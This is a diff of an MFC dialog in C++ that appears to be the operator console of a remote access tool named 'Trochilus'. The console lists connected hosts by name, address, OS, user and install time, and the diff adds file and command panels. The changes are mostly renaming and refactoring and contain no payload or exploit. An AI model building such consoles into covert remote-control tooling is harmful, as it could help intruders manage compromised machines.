@@ -6,6 +6,8 @@
 #include "HostDlg.h"
 #include "afxdialogex.h"
 #include "TrochilusDlg.h"
+#include "FilePanelDlg.h"
+#include "CmdDlg.h"
 
 // CHostDlg 对话框
 
@@ -23,12 +25,17 @@ CHostDlg::~CHostDlg()
 void CHostDlg::DoDataExchange(CDataExchange* pDX)
 {
 	CDialogEx::DoDataExchange(pDX);
-	DDX_Control(pDX, IDC_LIST_CLIENT, m_ClientList);
+	DDX_Control(pDX, IDC_LIST_CLIENT, m_Clientlist);
 }
 
+void CHostDlg::OnSysCommand(UINT nID, LPARAM lParam)
+{
+	CDialog::OnSysCommand(nID, lParam);
+}
 
 BEGIN_MESSAGE_MAP(CHostDlg, CDialogEx)
 	ON_WM_SIZE()
+	ON_WM_SYSCOMMAND()
 END_MESSAGE_MAP()
 
 
@@ -36,7 +43,7 @@ END_MESSAGE_MAP()
 
 void CHostDlg::StartPanel(CLIENT_INFO& info,LPVOID lpParameter)
 {
-	ClientControlPanelManager::GetInstanceRef().OpenControlPanel(info.clientid);
+	//msgManager::GetInstanceRef().OpenControlPanel(info.clientid);
 }
 void CHostDlg::ClientInfoNotify(UINT nMsg, LPVOID lpContext, LPVOID lpParameter)
 {
@@ -63,27 +70,26 @@ void CALLBACK CHostDlg::ClientInfoNotifyProc( UINT nMsg,CLIENT_INFO* pInfo )
 		{
 			m_clients[pInfo->clientid] = *pInfo;
 			g_online++;
-			int i = m_ClientList.AddClientInfo(&m_clients[pInfo->clientid]);
+			int i = m_Clientlist.AddClientInfo(&m_clients[pInfo->clientid]);
 
-			m_ClientList.SetItemColor((int)&m_clients[pInfo->clientid],RGB(255,0,0));
-			m_ClientList.Update(i);
+			m_Clientlist.SetItemColor((int)&m_clients[pInfo->clientid],RGB(255,0,0));
+			m_Clientlist.Update(i);
 		}
 		else
 		{
-			m_ClientList.SetItemColor((int)&m_clients[pInfo->clientid],RGB(255,0,0));
-			int i = m_ClientList.GetIdByData((int)&m_clients[pInfo->clientid]);
-			m_ClientList.Update(i);
+			m_Clientlist.SetItemColor((int)&m_clients[pInfo->clientid],RGB(255,0,0));
+			int i = m_Clientlist.GetIdByData((int)&m_clients[pInfo->clientid]);
+			m_Clientlist.Update(i);
 		}
 
-		m_ClientList.SetAlive(pInfo->clientid,TRUE);
+		m_Clientlist.SetAlive(pInfo->clientid,TRUE);
 	}
 	else if(nMsg == WM_DEL_CLIENT)
 	{
 		if (it != m_clients.end())
 		{
-			m_ClientList.SetAlive(pInfo->clientid,FALSE);
-			ClientControlPanelManager::GetInstanceRef().ClosePanelDlg(pInfo->clientid);
-			m_ClientList.DeleteClientInfo(&m_clients[pInfo->clientid]);
+			m_Clientlist.SetAlive(pInfo->clientid,FALSE);
+			m_Clientlist.DeleteClientInfo(&m_clients[pInfo->clientid]);
 		}
 	}
 
@@ -110,17 +116,17 @@ void CHostDlg::InitResize()
 void CHostDlg::InitView()
 {
 	//初始化在线主机列表
-	m_ClientList.SetExtendedStyle(LVS_EX_GRIDLINES | LVS_EX_FULLROWSELECT);	
-	m_ClientList.InsertColumn(0,_T("Computer Name"),LVCFMT_CENTER,130,-1);
-	m_ClientList.InsertColumn(1,_T("Lan"),LVCFMT_CENTER,120,-1);
-	m_ClientList.InsertColumn(2,_T("W-Lan"),LVCFMT_CENTER,115,-1);
-	m_ClientList.InsertColumn(3,_T("OS"),LVCFMT_CENTER,130,-1);
-	m_ClientList.InsertColumn(4,_T("CPU Frep"),LVCFMT_CENTER,140,-1);
-	m_ClientList.InsertColumn(5,_T("Memory(MB)"),LVCFMT_CENTER,140,-1);
-	m_ClientList.InsertColumn(6,_T("Languge"),LVCFMT_CENTER,140,-1);
-	m_ClientList.InsertColumn(7,_T("User"),LVCFMT_CENTER,110,-1);
-	m_ClientList.InsertColumn(8,_T("Protocol"),LVCFMT_CENTER,110,-1);
-	m_ClientList.InsertColumn(9,_T("Install Time"),LVCFMT_CENTER,140,-1);
+	m_Clientlist.SetExtendedStyle(LVS_EX_GRIDLINES | LVS_EX_FULLROWSELECT);	
+	m_Clientlist.InsertColumn(0,_T("Computer Name"),LVCFMT_CENTER,130,-1);
+	m_Clientlist.InsertColumn(1,_T("Lan"),LVCFMT_CENTER,120,-1);
+	m_Clientlist.InsertColumn(2,_T("W-Lan"),LVCFMT_CENTER,115,-1);
+	m_Clientlist.InsertColumn(3,_T("OS"),LVCFMT_CENTER,130,-1);
+	m_Clientlist.InsertColumn(4,_T("CPU Frep"),LVCFMT_CENTER,140,-1);
+	m_Clientlist.InsertColumn(5,_T("Memory(MB)"),LVCFMT_CENTER,140,-1);
+	m_Clientlist.InsertColumn(6,_T("Languge"),LVCFMT_CENTER,140,-1);
+	m_Clientlist.InsertColumn(7,_T("User"),LVCFMT_CENTER,110,-1);
+	m_Clientlist.InsertColumn(8,_T("Protocol"),LVCFMT_CENTER,110,-1);
+	m_Clientlist.InsertColumn(9,_T("Install Time"),LVCFMT_CENTER,140,-1);
 
 	m_Imagelist.Create(32,32,ILC_COLOR32|ILC_MASK,2,2);
 	HICON hIcon0 = ::LoadIcon (AfxGetResourceHandle(), MAKEINTRESOURCE(IDI_ICON_ONLINE));
@@ -130,9 +136,7 @@ void CHostDlg::InitView()
 	HICON hIcon2 = ::LoadIcon (AfxGetResourceHandle(), MAKEINTRESOURCE(IDI_ICON3));
 	m_Imagelist.Add(hIcon2);
 
-	m_ClientList.SetImageList(&m_Imagelist/*,LVSIL_SMALL*/);
-
-	m_ClientList.SetLDbClickCallBack(StartPanel,this);
+	m_Clientlist.SetImageList(&m_Imagelist/*,LVSIL_SMALL*/);
 }
 
 BOOL CHostDlg::OnInitDialog()
@@ -146,13 +150,6 @@ BOOL CHostDlg::OnInitDialog()
 		::MessageBox(NULL, _T("初始化工作线程失败！"), _T("Error"), MB_OK | MB_ICONERROR);
 		ExitProcess(0);
 	}
-
-	if (! MasterModuleManager::GetInstanceRef().Init())
-	{
-		::MessageBox(NULL, _T("初始化Master模块管理失败"), _T("Error"), MB_OK | MB_ICONERROR);
-		ExitProcess(0);
-	}
-
 	SetClientInfoNotifies(ClientInfoNotify,this);
 
 	return TRUE;  // return TRUE unless you set the focus to a control
@@ -164,5 +161,5 @@ void CHostDlg::OnSize(UINT nType, int cx, int cy)
 {
 	CDialogEx::OnSize(nType, cx, cy);
 	m_resizer.Move();
-	// TODO: 在此处添加消息处理程序代码
 }
+
